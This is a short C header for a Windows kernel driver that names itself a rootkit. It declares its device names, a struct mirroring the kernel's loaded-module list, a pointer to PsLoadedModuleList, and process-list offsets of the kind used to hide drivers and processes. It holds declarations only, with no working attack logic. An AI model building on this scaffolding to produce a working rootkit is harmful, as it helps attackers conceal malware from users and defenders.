#ifndef _ROOTKIT_H_
#define _ROOTKIT_H_

#define		ROOTKIT_WIN32_DEV_NAME		L"\\DosDevices\\myRootkitDrv"
#define		ROOTKIT_DEV_NAME			L"\\Device\\myRootkitDrv"

typedef struct _MODULE_ENTRY {
	LIST_ENTRY le_mod;
	ULONG  unknown[4];
	ULONG  base;
	ULONG  driver_start;
	ULONG  unk1;
	UNICODE_STRING driver_Path;
	UNICODE_STRING driver_Name;
} MODULE_ENTRY, *PMODULE_ENTRY;

PMODULE_ENTRY g_PsLoadedModuleList;

typedef struct {
	PVOID notused;
} ROOTKIT_EXT, *PROOTKIT_EXT;

//NTSTATUS CompleteRequest(PIRP Irp);

typedef struct {
    ULONG   processName;
    ULONG   processPid;
    ULONG   activeProcessListOffset;
} NTOSKRNL_OFFSETS, *PNTOSKRNL_OFFSETS;

#endif
